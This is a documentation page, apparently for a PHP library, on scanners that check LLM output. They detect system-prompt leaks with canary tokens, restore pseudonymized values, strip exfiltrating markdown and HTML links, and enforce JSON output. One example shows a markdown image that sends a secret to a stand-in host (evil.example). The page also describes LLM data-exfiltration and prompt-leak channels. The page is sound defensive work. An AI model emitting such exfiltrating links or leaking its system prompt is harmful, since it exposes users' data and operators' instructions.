---
title: "Output Scanners"
description: "De-anonymize, leak detection, markdown defang and format validation."
---

# Output Scanners

The output pipeline is the mirror of the input one. It runs in this order:

```text
normalize → deanonymize → output-leak → secret → pii → markdown-defang → nsfw → format
```

## DeanonymizeScanner

Restores the original values pseudonymized on input (the inverse of the PII
`encrypt` operator). It runs **early** so later scanners process the restored
text, but marks the restored spans **trusted** so the output PII/secret scanners
don't re-redact the user's own data. Only placeholders this request actually
minted are restored. See **[Vault Round-trip](/usage/vault)**.

## OutputLeakScanner (LLM07)

Detects **system-prompt leakage**:

- a **canary token** seeded into your system prompt reappearing in the output is
  proof of a leak → block;
- a verbatim **echo** of a long slice of the configured system prompt → block.

Both checks are whitespace-robust (a canary the model splits with spaces still
trips).

```php
'output' => [
    'canary' => env('WARDEN_CANARY'),          // e.g. a per-request random token
    'system_prompt' => env('WARDEN_SYSTEM_PROMPT'),
],
```

## MarkdownDefangScanner (LLM05)

Neutralises the markdown/HTML data-exfiltration channel — auto-loading images and
off-domain links smuggle data out via their URL the moment they render. It
covers:

- inline markdown images and links;
- reference-style link/image definitions;
- raw HTML `<img>` / `<a>` tags;
- angle-bracket autolinks `<http://…>`.

Protocol-relative (`//host`) and non-`http(s)` schemes (`data:`, `javascript:`)
are always defanged. Allow-list trusted hosts:

```php
'output' => ['allowed_domains' => ['cdn.myapp.com']],
```

```php
$out = Warden::inspectOutput('See ![x](https://evil.example/c?d=secret)');
$out->sanitizedText; // "See [image: x]" — URL gone
```

::: callout warning "Not a full HTML sanitizer"
This is a defensive transform over common renderer behaviour. Always also
escape/sanitize at render time for your specific renderer.
:::

## FormatScanner (LLM05)

Opt-in structured-output enforcement for machine-to-machine consumers. When JSON
is required it validates an object/array root and, if the JSON is wrapped in prose
or code fences, conservatively **repairs** it by extracting the first balanced
JSON value; otherwise it blocks.

```php
'output' => ['require_json' => true],
```

```php
Warden::inspectOutput("Here you go:\n```json\n{\"answer\":42}\n```")->sanitizedText;
// '{"answer":42}'
```
